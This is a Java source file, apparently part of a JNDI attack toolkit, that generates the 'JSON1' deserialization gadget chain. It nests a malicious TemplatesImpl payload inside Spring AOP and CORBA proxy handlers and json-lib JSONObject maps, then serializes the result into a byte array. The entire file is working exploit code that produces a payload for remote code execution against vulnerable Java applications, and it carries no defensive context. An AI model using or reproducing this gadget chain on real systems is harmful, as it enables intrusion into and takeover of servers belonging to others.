package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;
import net.sf.json.JSONObject;
import org.springframework.aop.framework.AdvisedSupport;

import javax.management.openmbean.*;
import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

public class JSON1 {

    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        Object tql    = Gadgets.createTemplatesImpl(type, param);
        Class  ifaces = Templates.class;
        CompositeType rt = new CompositeType("a", "b",
                new String[]{"a"},
                new String[]{"a"},
                new OpenType[]{javax.management.openmbean.SimpleType.INTEGER}
        );
        TabularType        tt = new TabularType("a", "b", rt, new String[]{"a"});
        TabularDataSupport t1 = new TabularDataSupport(tt);
        TabularDataSupport t2 = new TabularDataSupport(tt);

        // we need to make payload implement composite data
        // it's very likely that there are other proxy impls that could be used
        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(tql);
        InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", as);
        InvocationHandler cdsInvocationHandler      = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getCompositeType", rt));
        InvocationHandler invocationHandler         = (InvocationHandler) Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl");
        ((Map) Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(CompositeData.class, cdsInvocationHandler);
        Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
        final CompositeData cdsProxy = Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);

        JSONObject jo = new JSONObject();
        Map        m  = new HashMap();
        m.put("t", cdsProxy);
        Reflections.setFieldValue(jo, "properties", m);
        Reflections.setFieldValue(jo, "properties", m);
        Reflections.setFieldValue(t1, "dataMap", jo);
        Reflections.setFieldValue(t2, "dataMap", jo);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(Gadgets.makeMap(t1, t2));
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
